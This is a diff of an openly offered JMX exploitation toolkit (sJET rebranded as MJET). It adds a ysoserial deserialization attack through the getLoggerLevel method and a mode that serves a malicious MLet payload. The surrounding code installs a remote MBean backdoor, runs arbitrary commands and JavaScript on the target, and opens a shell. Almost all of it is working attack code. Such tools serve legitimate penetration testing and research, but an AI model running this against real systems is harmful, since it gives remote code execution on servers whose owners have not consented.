@@ -14,9 +14,12 @@ from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
 from threading import Thread
 
 import sys
+import os
 import time
 import jarray
 from jarray import array
+
+
 
 # Extra
 import argparse
@@ -25,8 +28,8 @@ import random
 import string
 
 
-authorSignature =  'sJET - siberas JMX Exploitation Toolkit\n'
-authorSignature += '======================================='
+authorSignature =  'MJET - MOGWAI LABS JMX Exploitation Toolkit\n'
+authorSignature += '==========================================='
 
 class TrustAllX509TrustManager(X509TrustManager):
     def checkClientTrusted(self, chain, auth):
@@ -63,19 +66,31 @@ def connectToJMX(args):
         print "[+] Connected: " + str(jmx_connector.getConnectionId())
         bean_server = jmx_connector.getMBeanServerConnection()
         return bean_server
-    except IOException:
+    except:
         print "[-] Error: Can't connect to remote service"
+        
+        if "Authentication failed! Invalid username or password" in str(sys.exc_info()[1]):
+           print "[-] Authentication failed! Invalid username or password"
+
         sys.exit(-1)
 ##########
+
+### WEBSERVER MODE ###
+def webserverMode(args):
+    startWebserver(args)
+    raw_input("[+] Press Enter to stop the service\n")
+
+### /WEBSERVER MODE ###
 
 ### INSTALL MODE ###
 
 def installMode(args):
     startWebserver(args)
     bean_server = connectToJMX(args)
-    installMBeans(args, bean_server)
+    installMBean(args, bean_server)
+    print "[+] Done"
 
-def installMBeans(args, bean_server):
+def installMBean(args, bean_server):
     # Installation, load javax.management.loading.MLet to install additional MBeans
     # If loading fails, the Mlet is already loaded...
     try:
@@ -146,7 +161,7 @@ def MakeHandlerClass(base_url):
         #Handler for the GET requests
         def do_GET(self):
             if self.path=="/":
-                mlet_code = '<html><mlet code="de.siberas.lab.SiberasPayload" archive="' + self.jar_name + '" name="Siberas:name=payload,id=1" codebase="' + self._base_url + '"></mlet></html>'
+                mlet_code = '<html><mlet code="de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload" archive="' + self.jar_name + '" name="MogwaiLabs:name=payload,id=1" codebase="' + self._base_url + '"></mlet></html>'
 
                 self.send_response(200)
                 self.send_header('Pragma', 'no-cache')
@@ -154,7 +169,7 @@ def MakeHandlerClass(base_url):
                 self.wfile.write(mlet_code)
 
             elif self.path.endswith('.jar'):
-                f = open("./payloads/siberas_mlet.jar")
+                f = open("./payloads/MogwaiLabsMJET-MLet.jar")
                 self.send_response(200)
                 self.send_header('Content-type', 'application/jar')
                 self.end_headers()
@@ -176,10 +191,11 @@ def MakeHandlerClass(base_url):
 def uninstallMode(args):
     bean_server = connectToJMX(args)
     uninstallMBeans(bean_server)
+    print "[+] Done"
 
 def uninstallMBeans(bean_server):
     try:
-        bean_server.unregisterMBean(ObjectName("Siberas:name=payload,id=1"))
+        bean_server.unregisterMBean(ObjectName("MogwaiLabs:name=payload,id=1"))
     except:
         print "[-] Error: The MBean is not registered in the target server"
         sys.exit(0)
@@ -198,7 +214,7 @@ def changePasswordMode(args):
 def changePassword(password, newpass, bean_server):
     # Payload execution
     # Load the Payload Met and invoke a method on it
-    mlet_bean = bean_server.getObjectInstance(ObjectName("Siberas:name=payload,id=1"))
+    mlet_bean = bean_server.getObjectInstance(ObjectName("MogwaiLabs:name=payload,id=1"))
     print "[+] Loaded " + str(mlet_bean.getClassName())
 
     inv_array1 = jarray.zeros(2, Object)
@@ -216,8 +232,6 @@ def changePassword(password, newpass, bean_server):
     else:
         print "[-] Unable to change password"
 
-
-    sys.stdout.write("\n")
     sys.stdout.flush()
 
 ### /CHANGE PASSWORD MODE ###
@@ -232,8 +246,8 @@ def commandMode(args):
 
 def executeCommand(password, cmd, bean_server):
     # Payload execution
-    # Load the Payload Met and invoke a method on it
-    mlet_bean = bean_server.getObjectInstance(ObjectName("Siberas:name=payload,id=1"))
+    # Load the Payload MLet and invoke a method on it
+    mlet_bean = bean_server.getObjectInstance(ObjectName("MogwaiLabs:name=payload,id=1"))
     print "[+] Loaded " + str(mlet_bean.getClassName())
 
     print "[+] Executing command: " + cmd
@@ -264,12 +278,12 @@ def scriptMode(args):
         script=myfile.read()
 
     executeJS(args.password, script, bean_server)
-
+    print "[+] Done"
 
 def executeJS(password, js, bean_server):
     # Payload execution
-    # Load the Payload Met and invoke a method on it
-    mlet_bean = bean_server.getObjectInstance(ObjectName("Siberas:name=payload,id=1"))
+    # Load the Payload MLet and invoke a method on it
+    mlet_bean = bean_server.getObjectInstance(ObjectName("MogwaiLabs:name=payload,id=1"))
     print "[+] Loaded " + str(mlet_bean.getClassName())
 
     print "[+] Executing script"
@@ -311,45 +325,93 @@ def startShell(password, bean_server):
 
 ### /SHELL MODE ###
 
+### DESERIALIZATION MODE ###
 
+def deserializationMode(args):
+
+    if not os.path.isfile('./ysoserial.jar'):
+        print "[-] Error: Did not find ysoserial.jar in this folder. Please download it from https://github.com/frohoff/ysoserial"
+        sys.exit(1)
+
+    sys.path.append("./ysoserial.jar")
+    print "[+] Added ysoserial API capacities"
+    
+    from ysoserial.payloads.ObjectPayload import Utils
+    
+    # Connect to the JMX server
+    bean_server = connectToJMX(args)
+
+
+    # Generate deserialization object with ysoserial.jar
+    payload_object = Utils.makePayloadObject(args.gadget, args.cmd)
+
+    # Command execution
+    # Load default MLet java.util.logging and invoke method getLoggerLevel on it
+    mlet_bean = bean_server.getObjectInstance(ObjectName("java.util.logging:type=Logging"))
+    print "[+] Loaded " + str(mlet_bean.getClassName())
+
+    print "[+] Passing ysoserial object as parameter to getLoggerLevel(String loglevel)"
+    inv_array1 = jarray.zeros(1, Object)
+    inv_array1[0] = payload_object
+
+    inv_array2 = jarray.zeros(1, String)
+    inv_array2[0] = String.canonicalName
+
+    try:
+       resource = bean_server.invoke(mlet_bean.getObjectName(), "getLoggerLevel", inv_array1, inv_array2)
+
+    except:
+        if "argument type mismatch" in str(sys.exc_info()[1]):
+           print "[+] Got an argument type mismatch exception - this is expected"
+
+        elif "Access denied! Invalid access level" in str(sys.exc_info()[1]):
+            print "[+] Got an access denied exception - this is expected"
+        else:
+           print "[-] Got a " + str(sys.exc_info()[1]) + "exception, exploitation failed"
+
+    sys.stdout.write("\n")
+    sys.stdout.flush()
+
+    print "[+] Done"
+
+### /DESERIALIZATION MODE ###
 
 ### PARSER ###
 # Map for clarity's sake
 def arg_install_mode(args):
-    print authorSignature
     installMode(args)
 def arg_command_mode(args):
-    print authorSignature
     commandMode(args)
 def arg_script_mode(args):
-    print authorSignature
     scriptMode(args)
 def arg_shell_mode(args):
-    print authorSignature
     shellMode(args)
 def arg_password_mode(args):
-    print authorSignature
     changePasswordMode(args)
 def arg_uninstall_mode(args):
-    print authorSignature
     uninstallMode(args)
+def arg_webserver_mode(args):
+    webserverMode(args)
+def arg_deserialization_mode(args):
+    deserializationMode(args)
 
-
+# print header
+print ""
+print authorSignature
 
 # Base parser
-parser = argparse.ArgumentParser(description = 'sJET allows an easy exploitation of insecure JMX services', epilog='--- sJET - siberas JMX Exploitation Toolkit ------------------', add_help=True)
+parser = argparse.ArgumentParser(description = 'MJET allows an easy exploitation of insecure JMX services', epilog='--- MJET - MOGWAI LABS JMX Exploitation Toolkit ------------------', add_help=True)
 parser.add_argument('targetHost', help='target IP address')
 parser.add_argument('targetPort', help='target JMX service port')
-parser.add_argument('password', help="the required password to access the payload methods")
+parser.add_argument('--jmxrole', help='remote JMX role')
+parser.add_argument('--jmxpassword', help='remote JMX password')
 subparsers = parser.add_subparsers(title='modes', description='valid modes', help='use ... MODE -h for help about specific modes')
 
 # Install mode
 install_subparser = subparsers.add_parser('install', help='install the payload MBean on the target')
+install_subparser.add_argument('password', help="the password that should be set after successful installation")
 install_subparser.add_argument('payload_url', help='URL to load the payload (full URL)')
 install_subparser.add_argument('payload_port', help='port to load the payload')
-install_subparser.add_argument('--jmxrole', help='remote JMX role')
-install_subparser.add_argument('--jmxpassword', help='remote JMX password')
-
 install_subparser.set_defaults(func=arg_install_mode)
 
 # Uninstall mode
@@ -357,24 +419,40 @@ uninstall_subparser = subparsers.add_parser('uninstall', help='uninstall the pay
 uninstall_subparser.set_defaults(func=arg_uninstall_mode)
 
 # Password mode
-install_subparser = subparsers.add_parser('password', help='change the payload password on the target')
-install_subparser.add_argument('newpass', help='The new password')
-install_subparser.set_defaults(func=arg_password_mode)
+password_subparser = subparsers.add_parser('changepw', help='change the payload password on the target')
+password_subparser.add_argument('password', help="the password to access the installed MBean")
+password_subparser.add_argument('newpass', help='The new password')
+password_subparser.set_defaults(func=arg_password_mode)
 
 # Command mode
 command_subparser = subparsers.add_parser('command', help='execute a command in the target')
+command_subparser.add_argument('password', help="the password to access the installed MBean")
 command_subparser.add_argument('cmd', help='command to be executed')
 command_subparser.set_defaults(func=arg_command_mode)
 
 # Javascript mode
 script_subparser = subparsers.add_parser('javascript', help='execute JavaScript code from a file in the target')
+script_subparser.add_argument('password', help="the password to access the installed MBean")
 script_subparser.add_argument('filename', help='file with the JavaScript code to be executed')
 script_subparser.set_defaults(func=arg_script_mode)
 
 # Shell mode
 shell_subparser = subparsers.add_parser('shell', help='open a simple command shell in the target')
+shell_subparser.add_argument('password', help="the required password to access the installed MBean")
 shell_subparser.set_defaults(func=arg_shell_mode)
 
+# Webserver mode
+webserver_subparser = subparsers.add_parser('webserver', help='just run the MLET web server')
+webserver_subparser.add_argument('payload_url', help='URL to load the payload (full URL)')
+webserver_subparser.add_argument('payload_port', help='port to load the system')
+webserver_subparser.set_defaults(func=arg_webserver_mode)
+
+
+# Deserialization mode
+deserialize_subparser = subparsers.add_parser('deserialize', help='send a ysoserial payload to the target')
+deserialize_subparser.add_argument('gadget', help='gadget as provided by ysoserial, e.g., CommonsCollections6')
+deserialize_subparser.add_argument('cmd', help='command to be executed')
+deserialize_subparser.set_defaults(func=arg_deserialization_mode)
 
 # Store the user args
 args = parser.parse_args()
